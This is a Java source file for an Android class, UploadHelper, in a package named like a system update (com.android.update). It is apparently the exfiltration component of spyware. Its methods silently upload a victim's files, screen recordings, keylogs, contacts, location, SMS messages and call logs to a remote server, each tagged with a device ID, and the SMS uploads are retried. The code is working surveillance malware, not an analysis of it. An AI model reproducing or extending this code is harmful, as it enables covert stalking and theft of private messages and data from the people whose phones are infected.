package com.android.update;

import android.content.Context;
import android.util.Log;
import java.io.File;
import java.io.InputStream;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.io.FileInputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;

import org.json.JSONObject;

public class UploadHelper {

    private static final String TAG = "UploadHelper";
    private static final int MAX_RETRIES = 3;
    private static final int RETRY_DELAY_MS = 2000;

    // ✅ For File Uploads (photos, videos, docs, screen recordings, etc)
    public static void uploadFile(Context context, File file, String endpoint) {
        new Thread(() -> {
            try {
                URL url = new URL(ServerConfig.endpoint(endpoint));
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/octet-stream");
                conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
                conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));

                OutputStream os = conn.getOutputStream();
                FileInputStream fis = new FileInputStream(file);
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = fis.read(buffer)) != -1) {
                    os.write(buffer, 0, bytesRead);
                }
                os.close();
                fis.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, file.getName() + " → upload_" + endpoint + " Response: " + responseCode);
            } catch (Exception e) {
                Log.e(TAG, "uploadFile failed [" + endpoint + "]: " + e.toString());
            }
        }).start();
    }

    // ✅ For Contact, Keylog, Location, Text Data
    public static void sendTextToServer(Context context, String type, String text) {
        try {
            URL url = new URL(ServerConfig.endpoint("upload_text"));
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(7000);
            conn.setReadTimeout(7000);
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/json");
            conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));

            JSONObject json = new JSONObject();
            json.put("type", type);
            json.put("data", text);

            OutputStream os = conn.getOutputStream();
            os.write(json.toString().getBytes("UTF-8"));
            os.close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "sendText [" + type + "] Response: " + responseCode);

            InputStream is = conn.getInputStream();
            BufferedReader reader = new BufferedReader(new InputStreamReader(is));
            StringBuilder response = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) response.append(line);
            reader.close();
            Log.d(TAG, "sendText body: " + response.toString());

        } catch (Exception e) {
            Log.e(TAG, "sendTextToServer failed [" + type + "]: ", e);
        }
    }

    // ✅ For SMS Logs (with retry)
    public static void sendSMSLogToServer(Context context, String sender, String message, String timestamp) {
        new Thread(() -> {
            int attempt = 0;
            while (attempt < MAX_RETRIES) {
                try {
                    URL url = new URL(ServerConfig.endpoint("upload_sms"));
                    HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                    conn.setRequestMethod("POST");
                    conn.setConnectTimeout(7000);
                    conn.setReadTimeout(7000);
                    conn.setDoOutput(true);
                    conn.setRequestProperty("Content-Type", "application/json");
                    conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));

                    JSONObject json = new JSONObject();
                    json.put("sender", sender);
                    json.put("message", message);
                    json.put("timestamp", timestamp);

                    OutputStream os = conn.getOutputStream();
                    os.write(json.toString().getBytes("UTF-8"));
                    os.close();

                    int responseCode = conn.getResponseCode();
                    Log.d(TAG, "sendSMS attempt " + (attempt + 1) + " Response: " + responseCode);

                    if (responseCode == 200) break;
                    attempt++;
                    Thread.sleep(RETRY_DELAY_MS);

                } catch (Exception e) {
                    Log.e(TAG, "sendSMS attempt " + (attempt + 1) + ": " + e.toString());
                    attempt++;
                    try { Thread.sleep(RETRY_DELAY_MS); } catch (InterruptedException ie) { break; }
                }
            }
        }).start();
    }

    // ✅ For Call Logs
    public static void sendCallLogsToServer(Context context, String logsJson) {
        new Thread(() -> {
            try {
                URL url = new URL(ServerConfig.endpoint("upload_call_logs"));
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setConnectTimeout(7000);
                conn.setReadTimeout(7000);
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));

                JSONObject json = new JSONObject();
                json.put("type", "call_logs");
                json.put("data", logsJson);

                OutputStream os = conn.getOutputStream();
                os.write(json.toString().getBytes("UTF-8"));
                os.close();

                int responseCode = conn.getResponseCode();
                Log.d(TAG, "sendCallLogs Response: " + responseCode);
            } catch (Exception e) {
                Log.e(TAG, "sendCallLogs failed: " + e.toString());
            }
        }).start();
    }

    // ✅ Blocking file upload (used in loops with retry)
    public static boolean uploadFileBlocking(Context context, File file, String endpoint) {
        try {
            URL url = new URL(ServerConfig.endpoint(endpoint));
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setRequestMethod("POST");
            conn.setConnectTimeout(15000);
            conn.setReadTimeout(15000);
            conn.setDoOutput(true);
            conn.setRequestProperty("Content-Type", "application/octet-stream");
            conn.setRequestProperty("Content-Disposition", "attachment; filename=\"" + file.getName() + "\"");
            conn.setRequestProperty("Device-ID", DeviceUtils.getDeviceId(context));

            OutputStream os = conn.getOutputStream();
            FileInputStream fis = new FileInputStream(file);
            byte[] buffer = new byte[4096];
            int bytesRead;
            while ((bytesRead = fis.read(buffer)) != -1) {
                os.write(buffer, 0, bytesRead);
            }
            os.close();
            fis.close();

            int responseCode = conn.getResponseCode();
            Log.d(TAG, "uploadFileBlocking [" + endpoint + "] Response: " + responseCode);
            return responseCode == 200;

        } catch (Exception e) {
            Log.e(TAG, "uploadFileBlocking [" + endpoint + "] failed: " + e.toString());
            return false;
        }
    }
}